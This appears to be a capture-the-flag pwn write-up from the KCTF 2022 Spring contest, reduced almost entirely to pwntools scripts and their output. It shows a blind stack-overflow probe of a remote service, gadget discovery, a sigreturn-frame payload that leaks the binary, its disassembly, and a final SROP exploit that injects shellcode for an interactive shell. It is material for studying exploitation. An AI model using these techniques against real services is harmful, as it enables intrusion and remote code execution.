# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/看雪2022_KCTF_春季赛_-_第六题设计思路及解析.md
# TITLE: 看雪2022 KCTF 春季赛 | 第六题设计思路及解析
# CATEGORY: pwn

from pwn import * context.log_level = "critical" def probe(v, want=b"TNT TNT!"): s = None try: s = remote(ip, port) s.recvuntil(b"hacker, TNT!n") s.send(v) r = s.recv(timeout=3) if (want is not None and want in r) or (want is None and len(r)>0): return "normal" else: return "stop" 
except EOFError: return "crash" finally: if s: s.close() return None
def test(prefix): for i in range(256): t = prefix + bytes([i]) c = probe(t, None) if c != "crash": print(hex(i), c) test(b"a"*16)
0xb0 normal0xb5 stop0xb6 stop0xb8 stop0xc2 stop0xc7 stop0xc9 stop0xce normal0xec stop0xed stop0xee stop0xef stop0xf2 stop0xf3 stop
test(b"a"*16 + b"xce")
0x0 normal
test(b"a"*16 + b"xcex00")
0x40 normal0x60 normal
probe(b"a"*16 + p64(0x4000ce)) # "normal"probe(b"a"*16 + p64(0x4000ce)[:7]+b"x01") # "crash"
def findret(prefix): for i in range(256*256): t = prefix + p64(0x400000 + i) + p64(0x4000ce) c = probe(t, b"TNT TNT!n") if c == "normal": print(hex(i), c) findret(b"a"*16)
0xce normal0x101 normal0x106 normal
0x4000b0: <do write "hacker, TNT!n"> call overflow0x4000ce: <do write "TNT TNT!n">overflow: <do read>0x400106: ret
from pwn import * sigframe = SigreturnFrame()sigframe.rax = 1sigframe.rdi = 1sigframe.rsi = 0x400000sigframe.rdx = 0x1000sigframe.rip = 0x4000c7 ip = <>port = <> s = remote(ip, port)s.recvuntil(b"hacker, TNT!n")s.send(b'a'*16 + p64(0x4000ee) + p64(0x4000c7) + bytes(sigframe))sleep(1) s.send(b'a'*15) r = s.recv()assert r.startswith(b"x7fELF")with open("tnt", "wb") as f: f.write(r) s.close()
tnt: file format elf64-x86-64 Disassembly of section .text: 00000000004000b0 <_start>: 4000b0: b8 01 00 00 00 mov eax,0x1 4000b5: 48 89 c7 mov rdi,rax 4000b8: 48 be 08 01 60 00 00 movabs rsi,0x600108 4000bf: 00 00 00 4000c2: ba 0d 00 00 00 mov edx,0xd 4000c7: 0f 05 syscall 4000c9: e8 20 00 00 00 call 4000ee <TNT66666> 4000ce: b8 01 00 00 00 mov eax,0x1 4000d3: 48 89 c7 mov rdi,rax 4000d6: 48 be 15 01 60 00 00 movabs rsi,0x600115 4000dd: 00 00 00 4000e0: ba 09 00 00 00 mov edx,0x9 4000e5: 0f 05 syscall 4000e7: b8 3c 00 00 00 mov eax,0x3c 4000ec: 0f 05 syscall 00000000004000ee <TNT66666>: 4000ee: 48 83 ec 10 sub rsp,0x10 4000f2: 48 31 c0 xor rax,rax 4000f5: ba 00 04 00 00 mov edx,0x400 4000fa: 48 89 e6 mov rsi,rsp 4000fd: 48 89 c7 mov rdi,rax 400100: 0f 05 syscall 400102: 48 83 c4 10 add rsp,0x10 400106: c3 ret
from pwn import * context.arch = "amd64"context.terminal = ["tmux", "split", "-h"] ip = <>port = <> #s = process("./tnt")s = remote(ip, port)#attach(s) s.recvuntil(b"hacker, TNT!n") sigframe = SigreturnFrame()sigframe.rip = 0x4000eesigframe.rsp = 0x600800 s.send(b'a'*16 + p64(0x4000ee) + p64(0x400100) + bytes(sigframe))sleep(1) s.send(b'a'*15)sleep(1) s.send(b'a'*16 + p64(0x600808) + asm(shellcraft.sh())) s.interactive()
